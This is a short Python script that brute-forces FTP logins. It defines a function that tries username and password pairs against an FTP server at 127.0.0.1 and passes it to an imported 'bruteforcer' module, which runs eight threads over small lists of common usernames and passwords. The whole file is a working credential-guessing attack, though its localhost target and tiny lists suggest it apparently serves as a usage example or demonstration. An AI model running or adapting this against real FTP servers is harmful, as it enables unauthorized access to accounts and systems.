import ftplib



def attempt_fx(pair):
	
		username = pair[0]
		password = pair[1]

		try:
			server = ftplib.FTP("127.0.0.1")
			server.login(username, password)
			return True

		except:
			return False



###################################################################################################################



import bruteforcer

number_threads = 8
wordlist_var = None
username_var = ["admin", "bill", "user", "demo"]
password_var = ["demo", "safe", "password"]

b = bruteforcer.Bruteforcer(number_threads, wordlist_var, username_var, password_var, attempt_fx)
b.run()
b.kill_all_threads()
